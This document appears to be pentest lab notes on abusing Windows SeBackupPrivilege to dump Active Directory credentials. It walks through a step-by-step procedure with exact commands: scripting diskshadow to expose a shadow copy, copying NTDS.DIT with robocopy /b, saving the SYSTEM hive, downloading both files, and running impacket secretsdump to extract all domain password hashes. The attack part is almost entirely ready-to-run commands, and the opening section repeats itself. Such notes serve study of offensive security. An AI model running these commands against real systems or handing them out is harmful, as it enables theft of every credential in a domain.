SeBackupPrivilege lets us:
- Read ANY file on the system regardless of permissions
- Including protected files like NTDS.DIT

The Attack Flow:
1. Use diskshadow to create a shadow copy of C: drive
   → Bypasses file locks on NTDS.DIT (it's always in use)
   → Mounts the shadow copy as E: drive

2. Use robocopy /b to copy NTDS.DIT from E: drive
   → /b flag uses backup semantics (SeBackupPrivilege)
   → Gets us the database file

3. Save the SYSTEM registry hive
   → Contains the boot key needed to decrypt NTDS.DIT

4. Download both files to Kali

5. Run secretsdump offline against them
   → Extracts ALL hashes without touching LSASS
-------------------

## SeBackupPrivilege

SeBackupPrivilege lets us:
- Read ANY file on the system regardless of permissions
- Including protected files like NTDS.DIT
```bash

Step 1 — Create the diskshadow script file:

powershell

[System.IO.File]::WriteAllLines("C:\Users\jackie\Desktop\ine.txt", @("set verbose on","set metadata C:\Windows\Temp\meta.cab","set context clientaccessible","set context persistent","begin backup","add volume C: alias ine","create","expose %ine% E:","end backup"))

# Verify it worked
type C:\Users\jackie\Desktop\ine.txt

```

```bash
Step 2 — Run diskshadow with the script

diskshadow /s C:\Users\jackie\Desktop\ine.txt
```

```bash
Step 3 — Copy NTDS.DIT from the shadow copy:

robocopy /b E:\Windows\NTDS . ntds.dit
```

```bash
Step 4 — Save the SYSTEM registry hive:

reg save hklm\system C:\Users\jackie\Desktop\system

#Results
The operation completed successfully.
```
```bash
Step 5 — Download both files to Kali

download ntds.dit
download system
```

```bash
Step 6 - Dump secrets

cd ~/impacket-latest/examples

python3 secretsdump.py -ntds ntds.dit -system system LOCAL
```